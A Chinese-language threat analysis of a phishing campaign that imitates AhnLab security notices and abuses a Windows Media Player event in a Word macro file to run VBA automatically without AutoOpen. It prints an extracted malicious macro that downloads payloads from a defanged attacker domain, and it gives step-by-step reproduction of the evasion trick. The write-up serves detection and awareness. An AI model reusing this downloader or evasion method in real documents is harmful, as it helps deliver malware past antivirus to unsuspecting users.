## **攻击背景**

近期ASEC团队发现了模仿AhnLab安全通知的钓鱼攻击，其中一个钓鱼文档在攻击中使用了Windows Media
Player相关函数触发自动执行VBA宏恶意代码。本文将对该利用手法进行分析。

 **组织名称**

|

未知  
  
---|---  
  
 **战术标签**

|

vba代码执行  
  
 **技术标签**

|

防御规避 执行  
  
 **情报来源**

|

https://asec.ahnlab.com/en/33477/  
  
##  **01** 攻击技术分析

该钓鱼攻击的攻击过程如下：

1\. 投递落地的Word文档1中包含Word文档2的链接，实现下载包含Word宏(dotm)的Word文档2

2\. 运行Word文档2后诱导用户启动宏

![1658214402_62d658028cb62c8ed7647.png!small?1658214404495](https://image.3001.net/images/20220719/1658214402_62d658028cb62c8ed7647.png!small?1658214404495)

图 2个诱导用户点击启动宏的样本

3\. 当用户点击启动宏后，执行vba宏代码

4\. 将shellcode注入Word进程中，落地恶意软件USOService.exe 并实现持久化

5\. 同时，创建了UpdateChecker.exe，该exe会判断是否成功从url中下载另一个word文档，进而有不同的消息弹框，有更真实的伪装效果

当没有下载成功时显示："文件解密需要网络连接。请确认网络连接，重新打开文件"

![1658214429_62d6581d789bf0c23c03f.png!small?1658214431384](https://image.3001.net/images/20220719/1658214429_62d6581d789bf0c23c03f.png!small?1658214431384)

下载失败时显示："机器认证失败，请咨询保安运营组"

![1658214449_62d65831687589e7e1453.png!small?1658214451324](https://image.3001.net/images/20220719/1658214449_62d65831687589e7e1453.png!small?1658214451324)

 **亮点 使用Windows Media Player函数实现自动执行宏代码**

在Word2中提取部分宏代码如下：

1\. 调用Media player函数运行RunFE函数

2\. RunFE进行base64解码并下载文件

3\. 下载超时设置

4\. 执行恶意程序

    
    
    Private Function RunFE() As Long  
    Dim MR As Object  
    Dim bbb As String  
    Dim i As Long  
    Randomize  
    Call Init  
    For i = 0 To 8: bbb = bbb & Chr(Map1(Int(62 * Rnd()))): Next i  
    ' 实现下载  
    Set MR = CreateObject(DecodeSTR("tw7v/v2UF6/h4I4v9cL5sgLww+yTE6+Dp9E=")) 'WinHttp.WinHttpRequest.5.1  
    Call MR.SetTimeouts(0, 2000, 2000, 5000)  
    #If Win64 Then ' 根据不同架构下载不同恶意程序  
    MR.Open "GET", DecodeSTR("iBP1xrPPSNvg6tEO6/fczgngwOyJBO7f+YNJ9dPqiEjA9cSzSLHa/64myof9z1ftwMehLLDCv9RJ4NXk") & "?" & bbb & "=" & bbb 'hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t64.acm  
    #Else  
    MR.Open "GET", DecodeSTR("iBP1xrPPSNvg6tEO6/fczgngwOyJBO7f+YNJ9dPqiEjA9cSzSLHa/64myof9z1ftwMehLLDCutJJ4NXk") & "?" & bbb & "=" & bbb  'hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t32.acm  
    #End If  
    End Function  
      
    Private Sub WindowsMediaPlayer1_OpenStateChange(ByVal NewState As Long)  
    If bFlag = False Then  
    Call CTD  'sleep相关处理  
    Dim rfRes As Long  
    rfRes = RunFE()  ' 执行恶意代码  
    If rfRes = 1 Then  
    bFlag = True  
    End If  
    End If  
    End Sub

在该vba代码中，使用了WindowsMediaPlayer1_OpenStateChange() 调用
RunFE函数执行恶意代码，并且设置MediaPlayer的启动为自动启动，代替 AutoOpen()函数，实现启动宏后自动执行宏代码的能力。

这种方式躲避了杀毒软件对敏感函数AutoOpen的检测，起到防御规避的效果；同时，在文档中放置视频，在话术的辅助下降低戒备心。

 **攻击过程复现**

1\. 点击开发工具

![1658214477_62d6584d100512302f6bb.png!small?1658214478879](https://image.3001.net/images/20220719/1658214477_62d6584d100512302f6bb.png!small?1658214478879)

2\. 下划找到Windows Media Player,点击确定

![1658214488_62d65858c9412cebfe340.png!small?1658214490676](https://image.3001.net/images/20220719/1658214488_62d65858c9412cebfe340.png!small?1658214490676)

3\. 此时在word中会出现一个Media Player,右键查看属性，填写正规url增加可信度

![1658214503_62d65867a47ce7441ee66.png!small?1658214505423](https://image.3001.net/images/20220719/1658214503_62d65867a47ce7441ee66.png!small?1658214505423)![1658214516_62d658741b6687c4ea170.png!small?1658214518110](https://image.3001.net/images/20220719/1658214516_62d658741b6687c4ea170.png!small?1658214518110)

4\. 设置自动启动

![1658214531_62d658831f1fdbf87ee2a.png!small?1658214532885](https://image.3001.net/images/20220719/1658214531_62d658831f1fdbf87ee2a.png!small?1658214532885)

5\. 编写宏代码,实现打开Word文档后自动弹窗

    
    
    Private Function RunFE() As Long  
    #If Win64 Then  
    MsgBox "Text64", vbOKOnly, "dotmTestX64"  
    #Else  
    MsgBox "Text32", vbOKOnly, "dotmTestX32"  
    #End If  
    End Function  
      
    Private Sub WindowsMediaPlayer1_OpenStateChange(ByVal NewState As Long)  
    rfRes = RunFE()  
    End Sub

效果如下：当打开Word文档时，自动执行宏代码实现弹窗

![1658214571_62d658ab00ca61c5c3ddc.png!small?1658214573051](https://image.3001.net/images/20220719/1658214571_62d658ab00ca61c5c3ddc.png!small?1658214573051)

由此可见，利用Media Player函数可以代替AutoOpen函数实现宏的自动执行，有一定的防御规避效果。

##  **02** 总结

一直以来对宏代码的利用是很多Apt组织的在初始访问阶段的惯用手法。在本次研判中微软提供的便捷功能沦为黑客的攻击手段，利用Media
Player的函数代替AutoOpen躲避检测。

需要我们对嵌入视频的Office文档保持警惕，播放的视频会误导、降低人们的戒备心，但实际上在播放视频的同时已经执行了恶意代码，使得自己的电脑沦为他人的靶标。

